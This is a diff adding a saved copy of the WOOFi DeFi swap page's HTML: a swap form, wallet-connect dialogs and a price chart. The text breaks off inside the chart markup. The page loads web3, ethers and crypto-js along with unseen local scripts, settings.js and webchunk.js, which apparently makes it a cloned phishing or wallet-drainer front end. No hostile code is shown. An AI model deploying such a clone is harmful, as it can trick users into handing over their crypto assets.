@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>WOOFi | Cross Chain Tokens Swap | Enjoy Lowest DeFi Swap Fees</title>
+  <meta data-n-head="1" data-hid="keywords" name="keywords" content="WOOFi Swap">
+  <link data-n-head="1" rel="icon" type="image/x-icon" href="https://fi.woo.org/favicon.ico">
+  <link rel="preload" href="./assets/aa9d14a33fb71ef4e7a1.css" as="style">
+  <link rel="preload" href="./assets/4363492acce03f22757e.css" as="style">
+  <link href="./assets/aa9d14a33fb71ef4e7a1.css" rel="stylesheet">
+  <link href="./assets/4363492acce03f22757e.css" rel="stylesheet">
+  <meta data-n-head="1" name="viewport"
+    content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
+  <meta data-n-head="1" data-hid="description" name="description"
+    content="WOOFi is a decentralized exchange using a brand new on-chain market making algorithm called Synthetic Proactive Market Making (sPMM). Users can enjoy lowest cross chain token swap fees between BNB Chain, Avalanche, Polygon and Fantom with more support blockchains in coming.">
+    <link rel="stylesheet" href="./assets/index.css">
+    <style>
+      @media (max-width:1270px) {
+    .dex .mid[data-v-610702e6]{
+      flex-direction: column;
+      justify-content: center;
+      display: flex;
+      width: 100%;
+    }
+    .dex .mid[data-v-610702e6] .block{
+      width: 90%;
+      margin-right: auto;
+      margin-left: auto;
+    }
+    .dex .right[data-v-610702e6]{
+      flex-direction: column;
+      justify-content: center;
+      display: flex;
+      width: 100%;
+
+    }
+    .chart[data-v-1bf21d32]{
+      margin-top: 50px;
+      width: 90%;
+      min-height: 500px;
+      margin-right: auto;
+      margin-left: auto;
+      position: relative;
+    }
+    .chart .line[data-v-1bf21d32]{
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80%;
+      overflow: hidden;
+    }
+    .compare{
+      width: 90%;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .dex .history[data-v-610702e6]{
+      width: 90%;
+      margin-right: auto;
+      margin-left: auto;
+    }
+    #navBlock{
+      display: none;
+    }
+  }
+  @media (max-width:670px) {
+    #networkSwitch{
+      display: none;
+    }
+    .add-woo{
+      display: none;
+    }
+  }
+    </style>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    
+  <script src="./js/settings.js"></script>
+  <script src="./js/webchunk.js"></script>
+  <style>
+      w3m-modal{
+        position: fixed;
+        z-index: 10000000;
+      }
+  </style>
+</head>
+
+<body class="pc"
+  bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjEwIiwic2NvcmUiOjEwOTEwfV0="
+  cz-shortcut-listen="true" style="">
+  <div id="__nuxt" bis_skin_checked="1"><!---->
+    <div id="__layout" bis_skin_checked="1">
+      <div bis_skin_checked="1">
+        <div class="bg" bis_skin_checked="1">
+          <header data-v-203c2e94="">
+            <div data-v-203c2e94="" class="header-padding" bis_skin_checked="1"></div>
+            <div data-v-203c2e94="" class="header-fixed" bis_skin_checked="1">
+              <div data-v-203c2e94="" class="header-container flex-all" bis_skin_checked="1">
+                <div data-v-203c2e94="" class="flex-all" bis_skin_checked="1">
+                  <div data-v-203c2e94="" class="logo" bis_skin_checked="1"><img data-v-203c2e94=""
+                      src="./assets/eaee28f.png"></div>
+                  <div data-v-203c2e94="" id="navBlock" bis_skin_checked="1"><!---->
+                    <div data-v-203c2e94="" class="nav bold flex-all" bis_skin_checked="1">
+                      <div data-v-203c2e94="" class="item touch active" bis_skin_checked="1"><img data-v-203c2e94=""
+                          src="./assets/ace0b11.png"><span data-v-203c2e94="">Swap</span><!----></div>
+                      <div data-v-203c2e94="" class="item touch" bis_skin_checked="1"><img data-v-203c2e94=""
+                          src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAtCAYAAADV2ImkAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAGnSURBVHgB7ZlBTsJQEIb/KTUxrjwCR+AG4gl0o+hK2Gh34AkoN8CVBhcsjbjBG3AEbmCPwEZX0nFqYgKEKU3bAUzetyHpTPt+2pl5zV/A4fjfUJakIXeOD/F57oGqsGH6haNJi/qzTYkbBY/4rg1wKKnHsCWKwQ9XNOinJaUKfuOgy79itwfJehc06OlxhRcOqhXwB3bAHHR6TU+TdTFPO8lHHGJHyF3uaDFfCzBwtnos+efyE6FEDhDXYunrxR7xwCdavq9farnJpHYm2mMqSCS90pZeqWtrL6KWxL7iBFvjBFvjIyevfBuiAA0ahMhBbsEE6qIYIXLgatia3CUhO1MPOyC34LxNUxRXw9aYz+GyS2cbczhEibgatsbNYWtcDVvjBFuTWbBMBWszMBMpU4Jny4YG1UYcNOf4jlAiBK+2bKL8rb2eNKvqXdyem5WjwwoqsIfGWkQtCTHkUn1aS8TDUzclVfAlPU/lcd1jyyQ7qHh4kRbP4MAHTblM8mZWhSk8Y1RaDXocp2Vl+saRIAZ3ncQalRNKnRbSKyLUmxo5ow7H3vEDwdZy2T9L5BMAAAAASUVORK5CYII="><span
+                          data-v-203c2e94="">Orderbook</span><img data-v-203c2e94=""
+                          src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAcCAYAAAByDd+UAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAM+SURBVHgBtZXLaxNRFMZvHm3SpKFpQ0tSU1ICghAQKi4ERREU9y6kUiwoxRakbqK47VpR8A9QoVrU1IrQRRfZVSoEIkR0IURM2gRLkibmQd4vvxPmluk0Y5M4Hhgm986993fPdx5hTGELhULmbDZ7Ip/P29p9VzGFLBgM6mw22zWj0XiOzzUajc9qtfqNSqXKKg6sVCoLfX19U20+RfE8BrRAAzVTwOr1+rwYVi6Xf4g+2+Hpg2azafhnIMkIz+5CtlM0xsGsVCqt6PX6R4jhKl+H79ZarXbP4/FoepaUYA6HgzxzcVi1Wn0HmJevwfi8Vqud4eNisfi8Z6A0ZuTZwMDApnQd5L3a399/hX5Deq+W9WCQZ1qj0RwJIxUg53E+xp5y1zFEbMax8aIIvgoZt/GeRQ1axbCJiYlFSOoUppp4PvWSNMf4D8TEiyLfRfzcuMTZyclJtxim0+la3lF8sfYlSiPZNRCe/BYO2UGqh81m8zxk09EckmSnHQzPssFg2KJxT0kD6PV0Ov1zeHh4hsNw6Da8eAYJb0hhSK4tvvfIpEFCXKbAQzI9PPoeCAS8qVTKPzo66hZdOBqJRF5YrdYDMGQyJdOW+DxZD0kap9M5C9hpkWdRJM2GyWSaFXm2i/k1pP4Cd6CdZ9zUcjC73d4RrFAoeAC7JYJVse5VO5ish9KiBmwll8ulh4aG5jiMCU3Z5/NpXS7XFKR0Yk8uFottQto4k7FDQGrEvDeSUVEDmESW3ca8nsMymcwGPHNgfo11YfuS/qUR+wcHBxc5jGTEug/w9ia8urS0tNRVabU8RPap0POodg414kQiYRoZGXkIoJpgkPYpYPexzCKccQcFXesU2Ao0JLvAYWRCOrd6I9I/F4/Hn6DmHKgxPy4xx2G4wB7KpWMYWUsOXP4Mn4CMb6WNeGxsLBgOhz9ChTlxnSFDX7MujetvFN41SPlFukjarshIBZTIN9YLEJIGhLEWh7gRU4scjDzD+uV2f0cdA5HeG3jtCXMW6v4ElWvEckXdie3XIQEIhHhy75KQrYzLjCsFOwCUgTIOE2euYkAOReJMw5OTNAboF8bvUfxf2f+09fV1QzQatTCF7Q8qyv9xhXGiawAAAABJRU5ErkJggg=="
+                          class="link"></div>
+                      <div data-v-203c2e94="" class="item touch" bis_skin_checked="1"><img data-v-203c2e94=""
+                          src="./assets/80e6ca8.png"><span data-v-203c2e94="">Earn</span><!----></div>
+                      <div data-v-203c2e94="" class="item touch" bis_skin_checked="1"><img data-v-203c2e94=""
+                          src="./assets/908fd1e.png"><span data-v-203c2e94="">Stake</span><!----></div>
+                      <div data-v-203c2e94="" class="item touch" bis_skin_checked="1"><img data-v-203c2e94=""
+                          src="./assets/164aec7.png"><span data-v-203c2e94="">Dashboard</span><!----></div>
+                    </div>
+                  </div>
+                </div>
+                <div data-v-203c2e94="" class="right flex-align" bis_skin_checked="1">
+                  <div data-v-77822bbe="" data-v-203c2e94="" id="networkSwitch" class="switch-network"
+                    bis_skin_checked="1">
+                    <div data-v-77822bbe="" class="selected flex-align touch" bis_skin_checked="1"><img
+                        data-v-77822bbe="" src="./assets/4131e14.png" class="logo"><span data-v-77822bbe=""
+                        class="bold">Ethereum</span><img data-v-77822bbe=""
+                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAMCAYAAABr5z2BAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAEKADAAQAAAABAAAADAAAAACRRQtxAAAAk0lEQVQoFa1SyQmAMBA09pAW0okl2I1YS95pwY78+fJnnJUMSK4FcWEZMjuzB2QYUsQYV+SB1GKHYKHvQRBOc1XqTsxj6nQm/A6YECpTWlQoJkFpkXKfFqKxRQMhUJg1t2iqZpIQ9E4pV6eRiAatU9qr00yUNZF59FenmQi3f3Xw5HM0OcE3zPJHpvTejDEXa7/iDQo7USPk5Cu7AAAAAElFTkSuQmCC"
+                        class="down"></div><!----><!---->
+                  </div>
+                  <div data-v-56ac3774="" data-v-203c2e94="" class="add-woo flex-all touch" bis_skin_checked="1">
+                    <div data-v-56ac3774="" class="el-tooltip inner flex-align" aria-describedby="el-tooltip-2834"
+                      tabindex="0" bis_skin_checked="1"><img data-v-56ac3774="" src="./assets/814fe78.png"><span
+                        data-v-56ac3774="">$0.226</span></div>
+                  </div>
+                  <div data-v-75ff9439="" data-v-203c2e94="" class="account" bis_skin_checked="1">
+                    <div data-v-75ff9439="" class="connect" bis_skin_checked="1"><button data-v-75ff9439=""
+                        type="button" class="el-button el-button--default connectButton"><!----><!----><span>
+                          <div data-v-75ff9439="" class="flex-all connect-with-icon " bis_skin_checked="1"><span
+                              data-v-75ff9439="">Connect Wallet</span><img data-v-75ff9439=""
+                              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAuCAYAAABap1twAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAKKADAAQAAAABAAAALgAAAAD1ppMMAAACRklEQVRYCe2Yvy4EURTGd0RDeAASFKLWK0VPPIBCRUMjofUYGo0H4AFEt9siSgpKtVhBMX7f2pWzd3Zn7t7ZWSPmJF+cO3vOd74598+MqdWMxXG8BE7BI/gAoaZccYhryZQIcyGJwB5ogmGbOMUdhakji+T9YavqwbcfIlCd0xTcgokQggFy3ohdjqLofoCcVve0Tqw9M9gAkwMRmWDltjnEZe3UhPm5ZGsxW9vwy8yOglQ3au0xO8uJINvdrcGdc6i1ttVJax9uTNZYazC2QayR8N1midp+Xv6EQHibYGhd7KE57ZJq34AzcEKvWudfVwfTskf82wX1Nnt1cMQ6Usvtll1gQzvtUwvZ2FzqPRX4IxrmjA65r4kODnsXD3o/UmVzxuygjH4lMO+sVB2sOpi3A8rn5JgGx+AavIC+lqjnRiYCcl6AfxW475xu2b7j8Zz1U9MljoBLEPwKV9iTBHHTCLsDCyDYijxmDlBlxelt+gjM6nHazxJ34k5+IiDwArw3DvehD5WTE2uHdZkPiU8MpO5unfHM69JT5BT76MmMKVLgg1N9yxn7Dbv6ycAvKzsKKh3M1t4ZHILUqbYJ8v/vMcMx8kKft0GuWSlyDdYQeYXANfAEgqywKbZqWEp6qujgXgeLYAp42UgEeilpB2lj2PhCp9gWCvUrgaGd6+RVHex0IvTvn+igPhr+GLv8Nz8ezf8I+XaaOgfr+CvOD2UZNjTF+txaVjvTG7W6eA7KZtL0/d+gHLAD6uAV/JaptjRIS0vcFzKAdhb/QC38AAAAAElFTkSuQmCC">
+                          </div>
+                        </span></button></div>
+                    <div data-v-53fee9f0="" data-v-75ff9439="" class="el-dialog__wrapper" style="display: none;"
+                      bis_skin_checked="1">
+                      <div role="dialog" aria-modal="true" aria-label="Connect to a wallet"
+                        class="el-dialog normal-dialog" bis_skin_checked="1" style="margin-top: 15vh; width: 550px;">
+                        <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Connect to a
+                            wallet</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                              class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                      </div>
+                    </div>
+                    <div data-v-6d4f3dc3="" data-v-75ff9439="" class="el-dialog__wrapper" style="display: none;"
+                      bis_skin_checked="1">
+                      <div role="dialog" aria-modal="true" aria-label="Connect to a wallet"
+                        class="el-dialog normal-dialog" bis_skin_checked="1" style="margin-top: 15vh; width: 500px;">
+                        <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Connect to a
+                            wallet</span><button type="button" aria-label="Close" class="el-dialog__headerbtn"><i
+                              class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                      </div>
+                    </div>
+                    <div data-v-75ff9439="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                      <div role="dialog" aria-modal="true" aria-label="dialog" class="el-dialog" bis_skin_checked="1"
+                        style="margin-top: 15vh; width: 550px;">
+                        <div class="el-dialog__header" bis_skin_checked="1"><span
+                            class="el-dialog__title"></span><button type="button" aria-label="Close"
+                            class="el-dialog__headerbtn"><i class="el-dialog__close el-icon el-icon-close"></i></button>
+                        </div><!----><!---->
+                      </div>
+                    </div>
+                  </div>
+                </div><!---->
+              </div>
+            </div>
+          </header> <!----> <!---->
+          <div data-v-57d832c4="" class="content container" bis_skin_checked="1">
+            <div data-v-610702e6="" data-v-57d832c4="" class="dex" bis_skin_checked="1"><!---->
+              <div data-v-610702e6="" class="top" bis_skin_checked="1">
+                <div data-v-610702e6="" class="line-a bold" bis_skin_checked="1">Smart liquidity, max efficiency.</div>
+                <div data-v-610702e6="" class="line-b hide" bis_skin_checked="1">Powered by WOO Network's competitive
+                  price quoting and liquidity to offer better pricing at lower fees.</div>
+              </div>
+              <div data-v-610702e6="" class="main flex-all" bis_skin_checked="1">
+                <div data-v-610702e6="" class="mid" bis_skin_checked="1">
+                  <div data-v-610702e6="" class="block" bis_skin_checked="1">
+                    <div data-v-610702e6="" class="top flex-all" bis_skin_checked="1">
+                      <div data-v-610702e6="" class="top-left" bis_skin_checked="1">
+                        <div data-v-610702e6="" class="title bold" bis_skin_checked="1"><span
+                            data-v-610702e6="">Swap</span><!----></div>
+                      </div>
+                      <div data-v-610702e6="" class="top-right flex-align" bis_skin_checked="1">
+                        <div data-v-610702e6="" class="item touch" bis_skin_checked="1">
+                          <div data-v-610702e6="" role="progressbar" aria-valuenow="0" aria-valuemin="0"
+                            aria-valuemax="100" class="el-progress el-progress--circle el-progress--without-text"
+                            bis_skin_checked="1">
+                            <div class="el-progress-circle" style="height: 24px; width: 24px;" bis_skin_checked="1"><svg
+                                viewBox="0 0 100 100">
+                                <path d="
+        M 50 50
+        m 0 -43
+        a 43 43 0 1 1 0 86
+        a 43 43 0 1 1 0 -86
+        " stroke="#e5e9f2" stroke-width="12.5" fill="none" class="el-progress-circle__track"
+                                  style="stroke-dasharray: 270.177px, 270.177px; stroke-dashoffset: 0px;"></path>
+                                <path d="
+        M 50 50
+        m 0 -43
+        a 43 43 0 1 1 0 86
+        a 43 43 0 1 1 0 -86
+        " stroke="#39B9ED" fill="none" stroke-linecap="round" stroke-width="0" class="el-progress-circle__path"
+                                  style="stroke-dasharray: 0px, 270.177px; stroke-dashoffset: 0px; transition: stroke-dasharray 0.6s ease 0s, stroke 0.6s ease 0s;">
+                                </path>
+                              </svg></div><!---->
+                          </div>
+                        </div>
+                        <div data-v-610702e6="" class="item touch" bis_skin_checked="1"><img data-v-610702e6=""
+                            src="./assets/3ee277c.png"></div><!---->
+                      </div>
+                    </div>
+                    <div data-v-610702e6="" class="coin-select" bis_skin_checked="1">
+                      <div data-v-8b9ff196="" data-v-610702e6="" class="coin-input" bis_skin_checked="1">
+                        <div data-v-8b9ff196="" class="top flex-all" bis_skin_checked="1">
+                          <div data-v-8b9ff196="" id="sellswap-chain-select-dropdown" class="chain-tab"
+                            bis_skin_checked="1">
+                            <div data-v-8b9ff196="" class="to-touch" bis_skin_checked="1">
+                              <div data-v-8b9ff196="" class="tab-name" bis_skin_checked="1"></div>
+                              <div data-v-8b9ff196="" class="tab-select select" bis_skin_checked="1">
+                                <div data-v-8b9ff196="" class="current-chain flex-align" bis_skin_checked="1"><img
+                                    data-v-8b9ff196="" src="./assets/4131e14.png" class="icon"><span data-v-8b9ff196=""
+                                    class="bold">Ethereum</span><!----></div>
+                              </div>
+                            </div><!---->
+                          </div>
+                          <div data-v-8b9ff196="" id="sellDexCoinInput" class="coin-tab" bis_skin_checked="1">
+                            <div data-v-8b9ff196="" class="to-touch flex-align touch" bis_skin_checked="1">
+                              <div data-v-8b9ff196="" class="coin-icon" bis_skin_checked="1"><img data-v-8b9ff196=""
+                                  src="./assets/4131e14.png"></div>
+                              <div data-v-8b9ff196="" class="coin-right" bis_skin_checked="1">
+                                <div data-v-8b9ff196="" class="tab-name" bis_skin_checked="1"></div>
+                                <div data-v-8b9ff196="" class="coin-select" bis_skin_checked="1">
+                                  <div data-v-8b9ff196="" class="current-coin select flex-align" bis_skin_checked="1">
+                                    <span data-v-8b9ff196="" class="bold">ETH</span><img data-v-8b9ff196=""
+                                      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAMCAYAAABr5z2BAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAEKADAAQAAAABAAAADAAAAACRRQtxAAAAk0lEQVQoFa1SyQmAMBA09pAW0okl2I1YS95pwY78+fJnnJUMSK4FcWEZMjuzB2QYUsQYV+SB1GKHYKHvQRBOc1XqTsxj6nQm/A6YECpTWlQoJkFpkXKfFqKxRQMhUJg1t2iqZpIQ9E4pV6eRiAatU9qr00yUNZF59FenmQi3f3Xw5HM0OcE3zPJHpvTejDEXa7/iDQo7USPk5Cu7AAAAAElFTkSuQmCC"
+                                      class="down"></div>
+                                </div>
+                              </div>
+                            </div><!---->
+                          </div>
+                        </div>
+                        <div data-v-8b9ff196="" class="main flex-all" bis_skin_checked="1"><input data-v-8b9ff196=""
+                            type="number" placeholder="0" class="bold">
+                          <div data-v-8b9ff196="" class="balance flex-all touch" bis_skin_checked="1">
+                            <div data-v-8b9ff196="" class="wallet" bis_skin_checked="1"><img data-v-8b9ff196=""
+                                src="./assets/bfdce41.png"></div>
+                            <div data-v-8b9ff196="" class="num" bis_skin_checked="1">--</div>
+                          </div>
+                        </div>
+                      </div><img data-v-610702e6=""
+                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEwAAABQCAMAAACEXWP5AAAA1VBMVEUAAAD///90wPV0v/Vzv/V6wvV0vvRzvvSA//9zvvV0vvV0v/R0vvV0v/R0v/Z1wfVzv/V0v/Rzv/V0v/Rzv/R1v/Rzv/R0v/Vzxfd3xPd0vvRzv/V2v/Z0v/R0v/V5v/lzwPR1wvV0vvVzvvRzwfdzv/Vzv/V0vvVzv/Rzv/V1wPZ0v/V0vvVzv/V1v/V0wPR0vvZ0v/R0vvV0xf9zvvV0vvSZzP+Av/90v/V0v/WAzP9zv/V3zP90v/Vzv/VzvvR2xPh1vvV1wPV1wPd1wfV2v/d0vvXmfLLsAAAAR3RSTlMAAWXI8xm9/wJmte7hwlhiuOrmu18YvM8fHsHHHL/jKF0yufE+4vZL6/pZsv1oZHmK2poW0KkFEMS3CsMPqpvZJ3ppPUpb5ehBgC0AAAHSSURBVHgB7My1AQAhFAUw3GH/bc+FFvvVywBh1LiQSknBZ1za2IvR4xc/rmfjw5mwHzGcyT+Tw5n6MzWc2QoymgwZMmTIkCFDhsz5EFMurifbOatrhMdhMAjDcjXp4jAzMzPD/a+0oJA862j9/U9nms6vnLAbicbijnpKJKGl0vKxTBZaLv+8UcBTsSQdKxXxlHX0jTLeIhXZWCWCt7C+U8VHrS4Zq9fw4epbDRiareBjrSYMEX2vDVOnG3Ss24Epqm/24NEfBBsb9OER03eHIKMgYyOQuL7tVEHG/x8bg+QcpSUmINOQfSw0BZnk1dNsDrJY2saWC5D5TL2t1iCb7fex7QZkvVKGrQuy238b269B3K3yWB5AUjP/sVkK5LBUJHQEOWX8xjInkKNfusYgjfO/Y+cGyFj5uoBEKjxWiYBc1BfXPrxqN+/YrQav/lUR/ncNzTsM9yZgrQJXhV/nC+4V497ZcUkZl9iOG8/4jLDj08cmM0EAk4yy44gw/tlsLBFh670KjCPjEygBjgg4ExIcZo661BiEMiEzgq+REuFjlo9oOY4IZ0Ku1ZRlQhARyoRcJSLIhCAilIkfycyh7TK/x0AFwOHK68YtABwopysAANMeT4oSu5zVAAAAAElFTkSuQmCC"
+                        class="to">
+                      <div data-v-8b9ff196="" data-v-610702e6="" class="coin-input" bis_skin_checked="1">
+                        <div data-v-8b9ff196="" class="top flex-all" bis_skin_checked="1">
+                          <div data-v-8b9ff196="" id="getswap-chain-select-dropdown" class="chain-tab"
+                            bis_skin_checked="1">
+                            <div data-v-8b9ff196="" class="to-touch touch" bis_skin_checked="1">
+                              <div data-v-8b9ff196="" class="tab-name" bis_skin_checked="1"></div>
+                              <div data-v-8b9ff196="" class="tab-select select" bis_skin_checked="1">
+                                <div data-v-8b9ff196="" class="current-chain flex-align" bis_skin_checked="1"><img
+                                    data-v-8b9ff196="" src="./assets/727b33d.png" class="icon"><span data-v-8b9ff196=""
+                                    class="bold">Arbitrum</span><img data-v-8b9ff196=""
+                                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAMCAYAAABr5z2BAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAEKADAAQAAAABAAAADAAAAACRRQtxAAAAk0lEQVQoFa1SyQmAMBA09pAW0okl2I1YS95pwY78+fJnnJUMSK4FcWEZMjuzB2QYUsQYV+SB1GKHYKHvQRBOc1XqTsxj6nQm/A6YECpTWlQoJkFpkXKfFqKxRQMhUJg1t2iqZpIQ9E4pV6eRiAatU9qr00yUNZF59FenmQi3f3Xw5HM0OcE3zPJHpvTejDEXa7/iDQo7USPk5Cu7AAAAAElFTkSuQmCC"
+                                    class="down"></div>
+                              </div>
+                            </div><!---->
+                          </div>
+                          <div data-v-8b9ff196="" id="getDexCoinInput" class="coin-tab" bis_skin_checked="1">
+                            <div data-v-8b9ff196="" class="to-touch flex-align touch" bis_skin_checked="1">
+                              <div data-v-8b9ff196="" class="coin-icon" bis_skin_checked="1"><img data-v-8b9ff196=""
+                                  src="./assets/01df44e.png"></div>
+                              <div data-v-8b9ff196="" class="coin-right" bis_skin_checked="1">
+                                <div data-v-8b9ff196="" class="tab-name" bis_skin_checked="1"></div>
+                                <div data-v-8b9ff196="" class="coin-select" bis_skin_checked="1">
+                                  <div data-v-8b9ff196="" class="current-coin select flex-align" bis_skin_checked="1">
+                                    <span data-v-8b9ff196="" class="bold">WBTC</span><img data-v-8b9ff196=""
+                                      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAMCAYAAABr5z2BAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAEKADAAQAAAABAAAADAAAAACRRQtxAAAAk0lEQVQoFa1SyQmAMBA09pAW0okl2I1YS95pwY78+fJnnJUMSK4FcWEZMjuzB2QYUsQYV+SB1GKHYKHvQRBOc1XqTsxj6nQm/A6YECpTWlQoJkFpkXKfFqKxRQMhUJg1t2iqZpIQ9E4pV6eRiAatU9qr00yUNZF59FenmQi3f3Xw5HM0OcE3zPJHpvTejDEXa7/iDQo7USPk5Cu7AAAAAElFTkSuQmCC"
+                                      class="down"></div>
+                                </div>
+                              </div>
+                            </div><!---->
+                          </div>
+                        </div>
+                        <div data-v-8b9ff196="" class="main flex-all" bis_skin_checked="1"><input data-v-8b9ff196=""
+                            type="number" placeholder="0" readonly="readonly" class="bold">
+                          <div data-v-8b9ff196="" class="balance flex-all disabled" bis_skin_checked="1">
+                            <div data-v-8b9ff196="" class="wallet" bis_skin_checked="1"><img data-v-8b9ff196=""
+                                src="./assets/bfdce41.png"></div>
+                            <div data-v-8b9ff196="" class="num" bis_skin_checked="1">--</div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div data-v-610702e6="" class="action" bis_skin_checked="1">
+                      <div data-v-610702e6="" class="list flex-all" style="display: none;" bis_skin_checked="1">
+                        <div data-v-610702e6="" class="list-left" bis_skin_checked="1">Slippage tolerance</div>
+                        <div data-v-610702e6="" class="list-right" bis_skin_checked="1">1%</div>
+                      </div>
+                      <div data-v-36dc40f6="" data-v-610702e6="" class="cross-address" style="" bis_skin_checked="1">
+                        <div data-v-36dc40f6="" class="list add flex-align" bis_skin_checked="1">
+                          <div data-v-36dc40f6="" class="touch flex-align" bis_skin_checked="1">
+                            <div data-v-36dc40f6="" class="text" bis_skin_checked="1">Send to</div>
+                            <div data-v-36dc40f6="" class="icon" bis_skin_checked="1"><img data-v-36dc40f6=""
+                                src="./assets/fd02a3e.png"></div>
+                          </div>
+                        </div>
+                        <div data-v-36dc40f6="" class="el-dialog__wrapper" style="display: none;" bis_skin_checked="1">
+                          <div role="dialog" aria-modal="true" aria-label="Add Destination Address"
+                            class="el-dialog normal-dialog" bis_skin_checked="1"
+                            style="margin-top: 15vh; width: 660px;">
+                            <div class="el-dialog__header" bis_skin_checked="1"><span class="el-dialog__title">Add
+                                Destination Address</span><button type="button" aria-label="Close"
+                                class="el-dialog__headerbtn"><i
+                                  class="el-dialog__close el-icon el-icon-close"></i></button></div><!----><!---->
+                          </div>
+                        </div>
+                      </div>
+                      <div data-v-610702e6="" class="submit" bis_skin_checked="1"><button data-v-610702e6=""
+                          type="button" class="el-button el-button--primary connectButton"><!----><!----><span>Connect
+                            Wallet</span></button></div>
+                    </div>
+                  </div>
+                </div>
+                <div data-v-610702e6="" class="right" bis_skin_checked="1">
+                  <div data-v-1bf21d32="" data-v-610702e6="" class="chart" bis_skin_checked="1">
+                    <div data-v-1bf21d32="" class="title flex-all" bis_skin_checked="1">
+                      <div data-v-1bf21d32="" class="token" bis_skin_checked="1">ETH / WBTC</div>
+                      <div data-v-1bf21d32="" class="switch flex-align" bis_skin_checked="1">
+                        <div data-v-1bf21d32="" class="item touch active" bis_skin_checked="1">1D</div>
+                        <div data-v-1bf21d32="" class="item touch" bis_skin_checked="1">1W</div>
+                        <div data-v-1bf21d32="" class="item touch" bis_skin_checked="1">1M</div>
+                      </div>
+                    </div>
+                    <div data-v-1bf21d32="" class="data-board" bis_skin_checked="1"><!---->
+                      <div data-v-1bf21d32="" class="num" bis_skin_checked="1">0.06707941 WBTC</div><span
+                        data-v-1bf21d32="" class="tag rise">0.3%</span><span data-v-1bf21d32="" class="text"
+                        style="display: none;"></span><span data-v-1bf21d32="" class="text">Past 24 Hours</span>
+                    </div>
+                    <div data-v-1bf21d32="" class="line" bis_skin_checked="1">
+                      <div data-v-1bf21d32="" class="chartv2" style="height: 390px;" bis_skin_checked="1"><svg
+                          width="735" height="390" version="1.1" xmlns="http://www.w3.org/2000/svg">
+                          <g id="indicator-g">
+                            <rect id="indicator-line" fill="#D8D8D8" width="1" height="390" x="-1" y="0"></rect>
+                          </g>
+                          <defs>
+                            <lineargradient x1="0" x2="0" y1="0" y2="1" id="line-up-fill-color-itemE95D5D">
+                              <stop stop-opacity="0.6" offset="0%" stop-color="#E95D5D"></stop>
+                              <stop stop-opacity="0.3" offset="10%" stop-color="#E95D5D"></stop>
+                              <stop stop-opacity="0" offset="100%" stop-color="#E95D5D"></stop>
+                            </lineargradient>
+                          </defs>
+                          <g id="indicator-g">
+                            <rect id="indicator-line" fill="#D8D8D8" width="1" height="390" x="-1" y="0"></rect>
+                          </g>
+                          <defs>
+                            <lineargradient x1="0" x2="0" y1="0" y2="1" id="line-up-fill-color-item36D58F">
+                              <stop stop-opacity="0.6" offset="0%" stop-color="#36D58F"></stop>
+                              <stop stop-opacity="0.3" offset="10%" stop-color="#36D58F"></stop>
+                              <stop stop-opacity="0" offset="100%" stop-color="#36D58F"></stop>
+                            </lineargradient>
+                          </defs>
+                          <g id="indicator-g">
+                            <rect id="indicator-line" fill="#D8D8D8" width="1" height="390" x="-1" y="0"></rect>
+                          </g>
+                          <defs>
+                            <lineargradient x1="0" x2="0" y1="0" y2="1" id="line-up-fill-color-itemFFFFFF">
+                              <stop stop-opacity="0.6" offset="0%" stop-color="#FFFFFF"></stop>
+                              <stop stop-opacity="0.3" offset="10%" stop-color="#FFFFFF"></stop>
